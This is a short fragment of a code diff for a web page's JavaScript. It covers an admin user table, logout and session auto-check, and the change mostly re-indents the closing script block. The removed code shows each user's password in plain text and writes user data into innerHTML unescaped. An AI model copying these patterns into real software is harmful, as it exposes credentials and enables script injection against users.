-        <td>${u.id}</td>
-        <td>${u.username}</td>
-        <td style="color:#e94560;font-family:monospace">${u.password}</td>
-        <td><span class="role-badge ${u.role}">${u.role}</span></td>
-        <td>${u.email}</td>
-      </tr>`;
-    }
-    html += '</table>';
-    container.innerHTML = html;
-  } catch (e) {
-    document.getElementById('admin-users').innerHTML =
-      `<div class="alert alert-error">Error: ${e.message}</div>`;
-  }
-}
-
-// ── Logout ────────────────────────────────────────────────────
-function doLogout() {
-  document.cookie = 'session=; Path=/; Expires=Thu, 01 Jan 1970 00:00:01 GMT;';
-  currentUser = null;
-  document.getElementById('tab-admin').style.display = 'none';
-  showSection('login');
-}
-
-// Auto-check de sesión al cargar
-(async () => {
-  if (document.cookie.includes('session=')) {
-    await loadDashboard();
-  }
-})();
-</script>
+    // Auto-check de sesión al cargar
+    (async () => {
+      if (document.cookie.includes('session=')) {
+        await loadDashboard();
+      }
+    })();
+  </script>
 </body>
+
 </html>
